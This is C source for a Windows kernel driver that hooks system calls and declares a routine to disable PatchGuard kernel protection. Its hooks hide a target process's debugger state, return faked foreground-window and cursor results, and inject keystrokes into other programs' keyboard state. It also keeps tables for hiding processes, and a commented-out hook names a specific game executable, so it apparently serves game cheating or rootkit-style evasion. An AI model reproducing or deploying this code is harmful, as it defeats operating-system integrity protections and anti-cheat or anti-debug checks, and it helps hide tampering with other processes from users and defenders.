#include "SSDT_NEW_FUN.h"

#include "HandleHide.h"

#include "MachineCode.h"

#include "gGlobal.h"

#include"PhysicalMemory.h"

#include "PE/KPE.h"


#ifdef DEBUG
#define LOG_DEBUG(format,...) DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,"[%d]" format,__LINE__, __VA_ARGS__);
#define LOG_DEBUG_I64X(x) LOG_DEBUG(#x":%I64X\n",x);
#define LOG_DEBUG_08X(x)  LOG_DEBUG(#x":%08X\n", x);
#else

#define LOG_DEBUG(format,...) DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,"[%d]" format,__LINE__, __VA_ARGS__);
#define LOG_DEBUG_I64X(x) LOG_DEBUG(#x":%I64X\n",x);
#define LOG_DEBUG_08X(x)  LOG_DEBUG(#x":%08X\n", x);
//#define LOG_DEBUG(format,...) //DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, format, __VA_ARGS__)
#endif




typedef union _ETW_FLAGS {
	struct {
		ULONG Flags : 29;
		ULONG offset : 3;
	}u;
	ULONG EtwFlags;
}ETW_FLAGS, * PETW_FLAGS;
//extern TABLE_HANDLE_INFO _TABLE_HANDLE_INFO;


DWORD64 PTE_BASE = 0;
DWORD64 PDE_BASE = 0;
DWORD64 PPE_BASE = 0;
DWORD64 PXE_BASE = 0;
DWORD64 PXE_SELFMAP = 0;
//PLM4[1] = ((a1 >> 9) & R8) + PLM4[0];
//LOG_DEBUG(" PDE_BASE <%p>\n", PLM4[1]);
//PLM4[2] = ((PLM4[1] >> 9) & R8) + PLM4[0];
//LOG_DEBUG(" PPE_BASE <%p>\n", PLM4[2]);
//PLM4[3] = ((PLM4[2] >> 9) & R8) + PLM4[0];
//LOG_DEBUG(" PXE_BASE <%p>\n", PLM4[3]);
//PLM4[4] = ((PLM4[3] >> 9) & R8) + PLM4[0];
//LOG_DEBUG(" PXE_SELFMAP <%p>\n", PLM4[4]);


ULONGLONG uKiTimerDispatch = 0;
ULONGLONG uKiFastFailDispatch = 0;
ULONGLONG uKiBugCheckDispatch = 0;
ULONGLONG uExGetBigPoolInfo = 0;

//ULONGLONG uKiBugCheckDispatch = 0;



ULONGLONG uPspTerminateProcess = 0;
ULONGLONG uPspUserThreadStartup = 0;
ULONGLONG uKeTerminateThread = 0;
ULONGLONG uKiMceLinkage = 0;
ULONGLONG uMiFreeUltraMapping = 0;

ULONGLONG uIopCreateFile = 0;
ULONGLONG uObCreateObject = 0;
ULONGLONG uObOpenObjectByName = 0;

ULONGLONG JGuardDispatch = 0;
ULONGLONG JGuardDispatchJGE = 0;
ULONGLONG JGuardDispatchJZ = 0;
ULONGLONG uGuard_Dispatch_Icall = 0;

ULONG64 _guard_retpoline_exit_indirect_rax = 0;

ULONGLONG uEtwTraceRetpolineExit = 0;


ULONGLONG uSeValidateImageData = 0;

ULONGLONG uSeValidateImageHeader = 0;

ULONGLONG uRtlDispatchException = 0;


ULONG64 pEtwpHostSiloState = 0;

DWORD KiTimerDispatch[3] = { 0 };

RTL_OSVERSIONINFOEXW OsVersion = { 0 };

BOOLEAN ReturnValue = TRUE;

KSPIN_LOCK SpinUserProcessLock;

MEM_LIST_PID  BgeinMemList = { 0 };

DWORD* KiBugCheckActive = 0;

DWORD KiBugCheckActiveFlags = 0;


DWORD64* _retpoline_image_bitmap;

BOOLEAN bIniFilterMutex = FALSE;
BOOLEAN bIniFilterProcess = FALSE;
BOOLEAN bIniInput = FALSE;
BOOLEAN bIniFilterFile = FALSE;
BOOLEAN bMustHwnd = FALSE;
BOOLEAN bMousePos = FALSE;


KTIMER kTimer;
KDPC kDpc;
RUNTIME_FUNCTION ArryKiInsertQueueDpcRunTime[0x20] = { 0 };
DWORD pKiInsertQueueDpcCount = 0;

RUNTIME_FUNCTION ArryKiSetTimerEx[0x20] = { 0 };
DWORD pKiSetTimerExCount = 0;

#define RunTime_Info(x)   RUNTIME_FUNCTION Arry##x[0x20]={0};\
                          DWORD p##x##Count = 0;

RunTime_Info(KiTraceSetTimer)


DWORD64* KiWaitNever = 0;
DWORD64* KiWaitAlways = 0;

DWORD64 pRunFlags = 0;

#define uint64_t unsigned long long
#define uint32_t unsigned long
#define uint16_t unsigned short
typedef unsigned __int64  uintptr_t;

BOOLEAN IniInputData();
BOOLEAN IniFilterFile();
BOOLEAN IniFilterMutex();
BOOLEAN IniFilterProcess();
BOOLEAN IniMustHwnd();
BOOLEAN IniMousePos();

void RemoveFlushDpcTimer();

void Disable_PathGuard_Handler(PVOID kBase);

VOID Remove_Dpc_Handler();
//BOOLEAN IniInputData(PEPROCESS Process);
//BOOLEAN IniFilterFile(PEPROCESS Process);
//BOOLEAN IniFilterMutex(PEPROCESS Process);
//BOOLEAN IniFilterProcess(PEPROCESS Process);
//BOOLEAN IniMustHwnd(PEPROCESS Process);
//BOOLEAN IniMousePos(PEPROCESS Process);

//typedef struct _RUNTIME_FUNCTION {
//	ULONG BeginAddress;
//	ULONG EndAddress;
//	ULONG UnwindData;
//} RUNTIME_FUNCTION, * PRUNTIME_FUNCTION;

HRAWINPUT g_hRawInput = 0;


AVL_INFO  TableAvl_KeyBoard;//Mouse
AVL_INFO  TableAvl_Data_Input; //Inpue
AVL_INFO  TableAvl_Hwnd; // Hwnd
AVL_INFO  TableAvl_Mouse;//Mouse
AVL_INFO  TableAvl_HideProcess;//Mouse


//extern PVOID GetProcAddress_Kernel(PVOID ModBase, const char* Name);

BOOLEAN NTAPI HandleGuardDispatch(ULONGLONG RCX, ULONGLONG RDX, ULONGLONG r8, ULONGLONG R9, ULONGLONG gFun, ULONGLONG CallR);

typedef  void (*PFUN_EtwTraceRetpolineExit)(
	DWORD64 Rax
	);

extern void wGuard_Dispatch_Icall();
extern void gGuard_Dispatch_Icall();


extern void indirect_rax(PVOID CALL, PVOID lINE);

extern ULONGLONG GetModuleBaseWow64_Self(UNICODE_STRING usModuleName);

extern 	PVOID GetProcAddress_Kernel(PVOID ModBase, const char* Name);

extern VOID wSleepNs(LONG msec);



uint64_t __ROR8__(uint64_t value, uint32_t bits) {
	return (value >> bits) | (value << (64 - bits));
}

//#define AVL_UNLOCK 4

typedef struct _FILTER_PID {
	DWORD64 LockSelf;
	HANDLE dwPID;
	HWND hwnd;
	BRPOINT p;
	BOOLEAN bON;
	RAWINPUT Raw;
	unsigned char key[256];
	int Type;
	int VKey;
}FILTER_PID, * PFILTER_PID;


//---------------------------------------------------------------------
_Function_class_(RTL_AVL_COMPARE_ROUTINE)
RTL_GENERIC_COMPARE_RESULTS CompareHandleTablePID(struct _RTL_AVL_TABLE* Table, PVOID  FirstStruct, PVOID  SecondStruct)
{
	PFILTER_PID first = (PFILTER_PID)FirstStruct;
	PFILTER_PID second = (PFILTER_PID)SecondStruct;
	UNREFERENCED_PARAMETER(Table);
	if (first->dwPID > second->dwPID)
		return GenericGreaterThan;
	if (first->dwPID < second->dwPID)
		return GenericLessThan;
	return GenericEqual;
}

_Function_class_(RTL_AVL_ALLOCATE_ROUTINE)
PVOID AllocateHandleTablePID(struct _RTL_AVL_TABLE* Table, CLONG  ByteSize)
{
	UNREFERENCED_PARAMETER(Table);
	return ExAllocatePoolWithTag(NonPagedPool, ByteSize, 'tag');
}

_Function_class_(RTL_AVL_FREE_ROUTINE)
VOID FreeHandleTablePID(struct _RTL_AVL_TABLE* Table, PVOID  Buffer)
{
	UNREFERENCED_PARAMETER(Table);
	ExFreePoolWithTag(Buffer, 'tag');
}





//---------FAST MEMORY-----------
_Function_class_(RTL_AVL_COMPARE_ROUTINE)
RTL_GENERIC_COMPARE_RESULTS CompareHandleTableMemoryUser(struct _RTL_AVL_TABLE* Table, PVOID  FirstStruct, PVOID  SecondStruct)
{
	PFILTER_PID first = (PFILTER_PID)FirstStruct;
	PFILTER_PID second = (PFILTER_PID)SecondStruct;
	UNREFERENCED_PARAMETER(Table);
	if (first->dwPID > second->dwPID)
		return GenericGreaterThan;
	if (first->dwPID < second->dwPID)
		return GenericLessThan;
	return GenericEqual;
}

_Function_class_(RTL_AVL_ALLOCATE_ROUTINE)
PVOID AllocateHandleTableMemoryUser(struct _RTL_AVL_TABLE* Table, CLONG  ByteSize)
{

	//NTSTATUS
	UNREFERENCED_PARAMETER(Table);
	return ExAllocatePoolWithTag(NonPagedPool, ByteSize, 'tag');
}



_Function_class_(RTL_AVL_FREE_ROUTINE)
VOID FreeHandleTableMemoryUser(struct _RTL_AVL_TABLE* Table, PVOID  Buffer)
{
	UNREFERENCED_PARAMETER(Table);
	ExFreePoolWithTag(Buffer, 'tag');
}


//BOOLEAN 

PFILTER_PID AVL_LOCK_CHANGE(DWORD flags, PAVL_INFO Avl, PFILTER_PID FilterInfo)
{
	return AVL_LOCK_CHANGE_VOID(flags, Avl, FilterInfo, sizeof(FILTER_PID));
}



PVOID AVL_LOCK_CHANGE_VOID(DWORD flags, PAVL_INFO Avl, PVOID pInfo, DWORD nSize)
{
	PVOID fID = 0;
	KIRQL irql = 0;
	KeAcquireSpinLock(&Avl->Lock, &irql);

	if (flags == AVL_ADD) {
		BOOLEAN r = FALSE;
		RtlInsertElementGenericTableAvl(&Avl->AVL_Table, pInfo, nSize, &r);
		if (r) {
			fID = pInfo;
		}
	}
	else if (flags == AVL_DEL) {

		PVOID pInfoV = RtlLookupElementGenericTableAvl(&Avl->AVL_Table, pInfo);
		if (pInfoV != 0) {
			//RtlCopyMemory(pInfo, pInfoV, nSize);
			if (*(DWORD64*)pInfoV == 0)
			{
				if (RtlDeleteElementGenericTableAvl(&Avl->AVL_Table, pInfo)) {
					fID = pInfo;
				}
			}
		}
	}
	else if (flags == AVL_GET) {
		PVOID pInfoV = RtlLookupElementGenericTableAvl(&Avl->AVL_Table, pInfo);
		if (pInfoV != 0)
		{
			RtlCopyMemory(pInfo, pInfoV, nSize);
		}
		fID = pInfoV;
	}
	else if (flags == AVL_MOD) {
		PVOID pInfoV = RtlLookupElementGenericTableAvl(&Avl->AVL_Table, pInfo);
		if (pInfoV != 0) {
			RtlCopyMemory(pInfoV, pInfo, nSize);
			fID = pInfoV;
		}
	}
	else if (flags == AVL_LOCK) {
		PVOID pInfoV = RtlLookupElementGenericTableAvl(&Avl->AVL_Table, pInfo);
		if (pInfoV != 0)
		{
			(*(DWORD64*)pInfoV)++;
			//RtlCopyMemory(pInfo, pInfoV, nSize);
		}
		fID = pInfoV;
	}
	else if (flags == AVL_UNLOCK) {
		PVOID pInfoV = RtlLookupElementGenericTableAvl(&Avl->AVL_Table, pInfo);
		if (pInfoV != 0) {
			if (*(DWORD64*)pInfoV > 0)
			{
				(*(DWORD64*)pInfoV)--;
			}
			//RtlCopyMemory(pInfo, pInfoV, nSize);
		}
		fID = pInfoV;
	}


	//__try
	//{
	//	//KeAcquireSpinLockAtDpcLevel(&Avl->Lock);

	//}
	//__except (1) {

	//	//STATUS_ABANDONED_WAIT_0
	//	LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	//}
	KeReleaseSpinLock(&Avl->Lock, irql);
	return fID;
}

BOOLEAN SetRawInput(HRAWINPUT hRawInput)
{
	g_hRawInput = hRawInput;
	return TRUE;
}

PVOID AVL_LOCK_CHANGE_PID_LIST(DWORD flags, PAVL_INFO Avl, PVOID pInfo, DWORD nSize)
{
	PFILTER_PID fID = 0;
	KIRQL irql = 0;
	KeAcquireSpinLock(&Avl->Lock, &irql);
	__try
	{

		if (flags == AVL_ADD) {
			BOOLEAN r = FALSE;
			RtlInsertElementGenericTableAvl(&Avl->AVL_Table, pInfo, nSize, &r);
			if (r) {
				fID = pInfo;
			}
		}
		else if (flags == AVL_DEL) {
			if (RtlDeleteElementGenericTableAvl(&Avl->AVL_Table, pInfo)) {
				fID = pInfo;
			}
		}
		else if (flags == AVL_GET) {
			PVOID pInfoV = RtlLookupElementGenericTableAvl(&Avl->AVL_Table, pInfo);
			if (pInfoV != 0)
			{
				RtlCopyMemory(pInfo, pInfoV, nSize);
			}
			fID = pInfoV;
		}
		else if (flags == AVL_MOD) {
			PVOID pInfoV = RtlLookupElementGenericTableAvl(&Avl->AVL_Table, pInfo);
			if (pInfoV != 0) {
				RtlCopyMemory(pInfoV, pInfo, nSize);
				fID = pInfoV;
			}
		}
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	KeReleaseSpinLock(&Avl->Lock, irql);
	return fID;
}














//---------------------------------------------------------------------------

BOOLEAN writeSafeMemory(PVOID adr, PVOID val, DWORD valSize);
BOOLEAN ReadSafeMemory(PVOID adr, PVOID val, DWORD valSize);


HANDLE dwPID = 0;

BOOLEAN IsAnd = FALSE;

typedef NTSTATUS(*p_NtDebugActiveProcess)(__in HANDLE ProcessHandle, __in HANDLE DebugObjectHandle);
typedef NTSTATUS(*p_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(*p_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(*p_NtGetContextThread)(__in HANDLE ThreadHandle, __inout PCONTEXT ThreadContext);

typedef  NTSTATUS(*pNtOpenMutant)(OUT PHANDLE MutantHandle,
	IN  ACCESS_MASK  DesiredAccess,
	IN  POBJECT_ATTRIBUTES    ObjectAttributes);

typedef  NTSTATUS(*pNtCreateMutant)(
	OUT PHANDLE MutantHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes  OPTIONAL,
	IN BOOLEAN InitialOwner);



typedef NTSTATUS(*pNtOpenEvent)(
	PHANDLE            EventHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	);

typedef  NTSTATUS(*pNtCreateEvent)(
	PHANDLE            EventHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	EVENT_TYPE         EventType,
	BOOLEAN            InitialState
	);

typedef NTSTATUS(*pNtCreateSection)(
	PHANDLE            SectionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER     MaximumSize,
	ULONG              SectionPageProtection,
	ULONG              AllocationAttributes,
	HANDLE             FileHandle
	);

typedef NTSTATUS(*pNtOpenSection)(
	PHANDLE            SectionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	);


typedef  NTSTATUS(pNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);


typedef struct _SYSTEM_BIGPOOL_ENTRY
{
	union
	{
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	ULONG_PTR SizeInBytes;
	union
	{
		UCHAR Tag[4];
		ULONG TagUlong;
	};
}SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;


typedef struct _SYSTEM_BIGPOOL_INFORMATION
{
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ANYSIZE_ARRAY];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;


#ifndef _WIN64
#define DUMP_BLOCK_SIZE 0x20000
#else
#define DUMP_BLOCK_SIZE 0x40000
#endif // !_WIN64


#define POOL_BIG_TABLE_ENTRY_FREE 0x1

typedef struct _POOL_BIG_PAGES {
	PVOID Va;
	DWORD Key;
	DWORD PoolType;
	ULONGLONG NumberOfPages;
} POOL_BIG_PAGES, * PPOOL_BIG_PAGES;

#ifdef _WIN64                                           
C_ASSERT(sizeof(POOL_BIG_PAGES) == sizeof(ULONGLONG) * 3);
#endif // _WIN64

typedef struct _POOL_BIG_PAGESEX {
	PVOID Va;
	DWORD Key;
	DWORD PoolType;
	ULONGLONG NumberOfPages;
	ULONGLONG Unuse;
} POOL_BIG_PAGESEX, * PPOOL_BIG_PAGESEX;

#ifdef _WIN64                                       
C_ASSERT(sizeof(POOL_BIG_PAGES) == sizeof(ULONGLONG) * 3);
#endif // _WIN64

enum {
	PgPoolBigPage,
	PgSystemPtes,
	PgMaximumType
};

enum {
	PgDeclassified,
	PgEncrypted,
	PgDoubleEncrypted
};




struct {
	union {
		PPOOL_BIG_PAGES* PoolBigPageTable;
		PPOOL_BIG_PAGESEX* PoolBigPageTableEx;
	};

	PULONGLONG PoolBigPageTableSize;

	char
	(NTAPI* MmIsNonPagedSystemAddressValid)(
		__in PVOID VirtualAddress
		);
}Pool; // pool big page


//TrueNtQueryInformationProcess


//typedef  unsigned int(*p_NtUserGetForegroundWindow)(void);
// 
typedef  HANDLE(NTAPI* p_NtUserGetForegroundWindow)(DWORD64 A, DWORD64 B, DWORD64 C, DWORD64 D);

typedef HANDLE(NTAPI* p_NtUserGetThreadState)(ULONG Routine, DWORD64 A, DWORD64 B, DWORD64 C);

typedef HANDLE(NTAPI* p_NtUserCallTwoParam)(void* Src, DWORD64 A, DWORD64 B);

typedef HANDLE(NTAPI* p_NtUserGetKeyboardState)(unsigned char* lpKeyState, DWORD64 A, DWORD64 B, DWORD64 C);

typedef HANDLE(NTAPI* p_NtUserGetRawInputBuffer)(PRAWINPUT pData, PUINT pcbSize, UINT  cbSizeHeader, DWORD64 A);

typedef HANDLE(NTAPI* p_NtUserGetRawInputBuffer)(PRAWINPUT pData, PUINT pcbSize, UINT  cbSizeHeader, DWORD64 A);

typedef HANDLE(NTAPI* p_NtUserWindowFromPoint)(POINT p, DWORD64 A, DWORD64 B, DWORD64 C);

typedef HANDLE(NTAPI* p_NtUserGetRawInputData)(HRAWINPUT hRawInput, UINT uiCommand, void* pData, PUINT pcbSize, UINT cbSizeHeader);







p_NtDebugActiveProcess TrueNtDebugActiveProcess = NULL;
p_NtQueryInformationProcess TrueNtQueryInformationProcess = NULL;
p_NtQuerySystemInformation TrueNtQuerySystemInformation = NULL;
p_NtGetContextThread TrueNtGetContextThread = NULL;

NTSTATUS mDbgNtDebugActiveProcess(__in HANDLE ProcessHandle, __in HANDLE DebugObjectHandle)
{
	NTSTATUS Status = STATUS_SUCCESS;
	if (TrueNtDebugActiveProcess != NULL)
	{
		Status = TrueNtDebugActiveProcess(ProcessHandle, DebugObjectHandle);
	}
	if (NT_SUCCESS(Status))
	{
		PVOID ReturnAddress = ((char*)&ProcessHandle) - sizeof(HANDLE);
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
			"DbgNtDebugActiveProcess64  %I64X\n", *(DWORD64*)ReturnAddress);
	}
	return Status;
}

NTSTATUS mNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG  ProcessInformationLength, PULONG ReturnLength)
{
	if (dwPID == PsGetCurrentProcessId()) {

		if ((ProcessInformationClass & 0x00000000FFFFFFFF) == ProcessDebugPort) {
			return STATUS_SUCCESS;
		}
		else if ((ProcessInformationClass & 0x00000000FFFFFFFF) == ProcessDebugFlags) {
			*((DWORD64*)ProcessInformation) = 1;
			return STATUS_SUCCESS;
		}
	}
	NTSTATUS status = STATUS_SUCCESS;
	if (TrueNtQueryInformationProcess != NULL)
	{
		status = TrueNtQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
	}
	return status;
}

NTSTATUS mNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	if (dwPID == PsGetCurrentProcessId())
	{
		//DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
		//	"NtQuerySystemInformation  PID : %d  TID:%d   %I64X\n", PsGetCurrentProcessId(),
		//	PsGetCurrentThreadId(), SystemInformationClass);
	}
	NTSTATUS status = STATUS_SUCCESS;
	if (TrueNtQuerySystemInformation != NULL)
	{
		status = TrueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	}
	return status;
}

NTSTATUS mNtGetContextThread(__in HANDLE ThreadHandle, __inout PCONTEXT ThreadContext)
{
	NTSTATUS status = TrueNtGetContextThread(ThreadHandle, ThreadContext);
	//ThreadContext->Dr0 = NULL;
	//ThreadContext->Dr1 = NULL;
	//ThreadContext->Dr2 = NULL;
	//ThreadContext->Dr3 = NULL;
	return status;
}


//--------------------------- 


//---------------------------------



BOOL bIniHwnd = FALSE;


BOOLEAN AddForeHwnd(HANDLE dwID, HANDLE hwnd) {

	//DWORD64 uType = WeGetProcessType(dwID);
	//if ((uType & 1) == 0)
	//{
	//	PEPROCESS Process = 0;
	//	NTSTATUS rNt = PsLookupProcessByProcessId(dwID, &Process);
	//	if (NT_SUCCESS(rNt) && Process != 0)
	//	{
	//		KAPC_STATE stack = { 0 };
	//		KeStackAttachProcess(Process, &stack);
	//		IniMustHwnd();
	//		KeUnstackDetachProcess(&stack);
	//		ObDereferenceObject(Process);
	//		WeSetProcessType(dwID, uType | 1);
	//	}
	//}

	if (!bIniHwnd)
	{
		IniMustHwnd();
		bIniHwnd = TRUE;
	}
	__try
	{

		//PTHREADINFO

		FILTER_PID Info = { 0 };
		Info.dwPID = dwID;
		FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Hwnd, &Info);
		if (pGr != 0)
		{
			AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Hwnd, &Info);
			return TRUE;
		}
		Info.dwPID = dwID;
		Info.hwnd = hwnd;
		return AVL_LOCK_CHANGE(AVL_ADD, &TableAvl_Hwnd, &Info) != 0;
	}
	__except (1) {
		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return FALSE;
}



p_NtUserWindowFromPoint  TrueNtUserWindowFromPoint = 0;

DWORD NtUserWindowFromPointIndex = 0xFFFFFFFF;

HWND Br_NtUserWindowFromPoint(POINT p, DWORD64 A, DWORD64 B, DWORD64 C) {

	//LOG_DEBUG("%s  %d\n", __FUNCTION__, PsGetCurrentProcessId());
	__try {
		FILTER_PID Info = { 0 };
		Info.dwPID = PsGetCurrentProcessId();
		FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Hwnd, &Info);
		if (pGr != 0)
		{
			HANDLE hWnd = pGr->hwnd;
			AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Hwnd, &Info);
			return hWnd;
		}
		return TrueNtUserWindowFromPoint(p, A, B, C);
	}
	__except (1) {
		LOG_DEBUG("__except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return 0;
}



p_NtUserGetForegroundWindow TrueNtUserGetForegroundWindow = 0;
DWORD NtUserGetForegroundWindowIndex = 0xFFFFFFFF;

HANDLE NTAPI Br_NtUserGetForegroundWindow(DWORD64 A, DWORD64 B, DWORD64 C, DWORD64 D)
{
	//LOG_DEBUG("%s  %d\n", __FUNCTION__, PsGetCurrentProcessId());
	__try {
		FILTER_PID Info = { 0 };
		Info.dwPID = PsGetCurrentProcessId();
		FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Hwnd, &Info);
		if (pGr != 0){
			HANDLE hWnd = pGr->hwnd;
			AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Hwnd, &Info);
			return hWnd;
		}
	}
	__except (1) {
		LOG_DEBUG("__except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return TrueNtUserGetForegroundWindow(A, B, C, D);
}

typedef __int64(__fastcall* fUserPeekMessage)(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
fUserPeekMessage TrueNtUserpeekmessage = 0;

NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);



//单位是微秒  1秒=1000毫秒=1000*1000微秒
VOID WaitMicroSecond(ULONG ulMircoSecond)
{
	KEVENT kEvent;
	//初始化一个未激发的内核事件
	KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);

	//等待时间的单位是100纳秒，将微秒转换成这个单位
	//负数代表是从此刻到未来的某个时刻
	LARGE_INTEGER timeout = RtlConvertLongToLargeInteger(-10 * ulMircoSecond);

	//在经过timeout后，线程继续运行
	KeWaitForSingleObject(&kEvent,
		Executive,
		KernelMode,
		FALSE,
		&timeout);
}



//__int64 NTAPI Br_NtUserpeekmessage(__int64 a1, __int64 a2, __int64 a3, __int64 a4) {
//	UCHAR* pName = PsGetProcessImageFileName(PsGetCurrentProcess());
//	if (_stricmp(pName,"LOSTARK.EXE"))
//	{
//		WaitMicroSecond(3000000);
//	}
//	return TrueNtUserpeekmessage(a1, a2, a3, a4);
//}






p_NtUserGetThreadState TrueNtUserGetThreadState = 0;

DWORD NtUserGetThreadStateIndex = 0xFFFFFFFF;


HANDLE NTAPI Br_NtUserGetThreadState(ULONG Routine, DWORD64 A, DWORD64 B, DWORD64 C) {


	//LOG_DEBUG("%s  %d\n", __FUNCTION__,PsGetCurrentProcessId());
	__try {
		if (Routine < 4)
		{
			FILTER_PID Info = { 0 };
			Info.dwPID = PsGetCurrentProcessId();
			FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Hwnd, &Info);
			if (pGr != 0)
			{
				HANDLE hWnd = pGr->hwnd;
				AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Hwnd, &Info);
				return hWnd;
			}
		}
		//return TrueNtUserGetThreadState(Routine);
	}
	__except (1) {
		LOG_DEBUG("except %s  %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return TrueNtUserGetThreadState(Routine, A, B, C);
}

BOOLEAN AddFixPoint(HANDLE dwID, BRPOINT p, int Type) {

	__try
	{
		//DWORD64 uType = WeGetProcessType(dwID);
		//if ((uType & 2) == 0)
		//{
		//	PEPROCESS Process = 0;
		//	NTSTATUS rNt = PsLookupProcessByProcessId(dwID, &Process);
		//	if (NT_SUCCESS(rNt) && Process != 0)
		//	{
		//		KAPC_STATE stack = { 0 };
		//		KeStackAttachProcess(Process, &stack);
		//		IniMousePos();
		//		KeUnstackDetachProcess(&stack);
		//		ObDereferenceObject(Process);
		//		WeSetProcessType(dwID, uType | 2);
		//	}
		//}


		if (!bMousePos)
		{
			bMousePos = IniMousePos();
		}
		//if (bMousePos)
		//{
		FILTER_PID Info = { 0 };
		RtlZeroMemory(&Info, sizeof(Info));
		Info.dwPID = dwID;
		FILTER_PID* Gr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_Mouse, &Info);
		if (Gr != 0) {
			Gr->p = p;
			Gr->bON = TRUE;
			Gr->Type = Type;
			return AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_Mouse, &Info) != 0;
		}
		Info.p = p;
		Info.bON = TRUE;
		Info.Type = Type;
		return AVL_LOCK_CHANGE(AVL_ADD, &TableAvl_Mouse, &Info) != 0;
		//}
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}


	return FALSE;
}

BOOLEAN StopFixPoint(HANDLE dwID) {
	FILTER_PID Info = { 0 };
	Info.dwPID = dwID;
	return AVL_LOCK_CHANGE(AVL_DEL, &TableAvl_Mouse, &Info) != 0;
}



BOOLEAN AddKeyBoard(HANDLE dwID, int p, int Type) {
	__try
	{
		FILTER_PID Info = { 0 };
		RtlZeroMemory(&Info, sizeof(Info));
		Info.dwPID = dwID;
		FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_KeyBoard, &Info);
		if (pGr != 0) {

			if (Type == 1)
			{
				pGr->key[p] = 0x80;
			}
			else if (Type == 0)
			{
				pGr->key[p] = 0x00;
			}
			return AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_KeyBoard, &Info) != 0;
		}
		if (Type == 1)
		{
			Info.key[p] = 0x80;
		}
		else if (Type == 0)
		{
			Info.key[p] = 0x00;
		}
		return AVL_LOCK_CHANGE(AVL_ADD, &TableAvl_KeyBoard, &Info) != 0;
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());
	}
	return FALSE;
}


BOOLEAN StopKeyBoard(HANDLE dwID, int Type) {



	return FALSE;

}


p_NtUserGetKeyboardState TrueNtUserGetKeyboardState = 0;
DWORD NtUserGetKeyboardStateIndex = 0xFFFFFFFF;
HANDLE NTAPI Br_NtUserGetKeyboardState(unsigned char* pKey, DWORD64 A, DWORD64 B, DWORD64 C)
{
	//LOG_DEBUG("%s  %d\n", __FUNCTION__, PsGetCurrentProcessId());
	if (TrueNtUserGetKeyboardState != 0)
	{
		__try {
			FILTER_PID Info = { 0 };
			Info.dwPID = PsGetCurrentProcessId();
			FILTER_PID* pGr = AVL_LOCK_CHANGE(AVL_LOCK, &TableAvl_KeyBoard, &Info);
			if (pGr == 0)
			{
				return TrueNtUserGetKeyboardState(pKey, A, B, C);
			}
			HANDLE r = TrueNtUserGetKeyboardState(pKey, A, B, C);
			//LOG_DEBUG("key <%p>\n", pKey);

			KIRQL  irql = KfRaiseIrql(APC_LEVEL);
			__try
			{
				for (int iKey = 0; iKey < 256; iKey++)
				{
					pKey[iKey] = pKey[iKey] | pGr->key[iKey];
				}
			}
			__except (1) {

			}
			KeLowerIrql(irql);
			AVL_LOCK_CHANGE(AVL_UNLOCK, &TableAvl_KeyBoard, &Info);
			return r;
		}
		__except (1) {
			LOG_DEBUG("except %s  %08X\n", __FUNCTION__, GetExceptionCode());
		}

	}
	return 0;
}
DWORD TwoType = 0x69;
p_NtUserCallTwoParam TrueNtUserCallTwoParam = 0;
unsigned long NtUserCallTwoParamIndex = 0xFFFFFFFF;
